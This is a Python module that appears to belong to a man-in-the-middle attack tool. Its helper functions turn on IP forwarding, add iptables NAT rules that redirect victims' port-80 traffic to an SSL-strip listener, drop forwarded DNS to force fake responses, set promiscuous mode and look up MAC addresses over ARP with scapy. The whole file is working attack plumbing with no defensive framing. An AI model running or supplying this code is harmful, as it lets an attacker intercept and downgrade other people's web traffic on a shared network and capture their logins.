import time
import os
import scapy.all as scapy
import subprocess
from . import STATUS, SSL_STRIP_PORT

# GLOBAL STATE TRACKER
# Prevents duplicate logs/commands if cleanup is called multiple times
IPTABLES_STATE = False 

def log_msg(message):
    timestamp = time.strftime('%H:%M:%S')
    full_msg = f"[{timestamp}] {message}"
    
    # 1. Update View (Limited size, clearable)
    if len(STATUS["logs"]) > 100: STATUS["logs"].pop(0)
    STATUS["logs"].append(full_msg)
    
    # 2. Update History (Unlimited, permanent)
    STATUS["all_logs"].append(full_msg)
    
    print(full_msg)

def set_ip_forwarding(value):
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write(str(value))
    except: pass

def set_port_forwarding(enable):
    """
    Configures IP Tables to redirect Port 80 traffic to Port 10000.
    Includes State Checking to prevent duplicate logs.
    """
    global IPTABLES_STATE
    
    try:
        if enable:
            # If already active, do nothing
            if IPTABLES_STATE: 
                return 
            
            # Enable Rule
            cmd = f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
            os.system(cmd)
            log_msg(f"[NET] Traffic Redirection: ENABLED (Port 80 -> {SSL_STRIP_PORT})")
            log_msg(f"[SYSTEM] IP Tables rule ADDED for SSL Strip.")
            IPTABLES_STATE = True
            
        else:
            # If already disabled, do nothing
            if not IPTABLES_STATE: 
                return 
            
            # Disable Rule
            cmd = f"iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
            os.system(cmd)
            log_msg(f"[SYSTEM] IP Tables rule REMOVED for SSL Strip.")
            IPTABLES_STATE = False
            
    except Exception as e:
        log_msg(f"[!] IP Tables Error: {e}")

def set_dns_blocking(enable):
    try:
        # Use -I (Insert) for adding, -D (Delete) for removing
        if enable:
            rule = f"iptables -I FORWARD -i {STATUS['interface']} -p udp --dport 53 -j DROP"
            os.system(rule)
            log_msg("[SYSTEM] DNS Forwarding BLOCKED (Force Fake Response)")
        else:
            # Only try to remove if we think it might exist (though less critical than port forwarding)
            rule = f"iptables -D FORWARD -i {STATUS['interface']} -p udp --dport 53 -j DROP"
            os.system(rule)
            log_msg("[SYSTEM] DNS Forwarding Restored")
    except Exception as e:
        log_msg(f"[!] DNS Rules Error: {e}")

def set_promiscuous_mode(interface, enable):
    """ Enables/Disables Promiscuous Mode on the interface """
    try:
        # Check if we are root
        if os.geteuid() != 0: return 
            
        action = "promisc" if enable else "-promisc"
        
        # Try 'ip' command first (Modern Linux)
        if os.path.exists('/sbin/ip') or os.path.exists('/usr/sbin/ip') or os.path.exists('/bin/ip'): 
            subprocess.run(['ip', 'link', 'set', interface, action, 'on' if enable else 'off'], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        # Fallback to 'ifconfig'
        elif os.path.exists('/sbin/ifconfig'): 
            subprocess.run(['ifconfig', interface, action], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if enable:
            log_msg(f"[+] Interface {interface} set to Promiscuous Mode.")
        else:
            pass # Silent on disable

    except Exception as e:
        log_msg(f"[!] Warning: Could not set Promiscuous Mode: {e}")

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        # specific interface ensures we don't send on loopback
        answered_list = scapy.srp(broadcast/arp_request, timeout=1, verbose=False, iface=STATUS["interface"])[0] 
        return answered_list[0][1].hwsrc if answered_list else None
    except: return None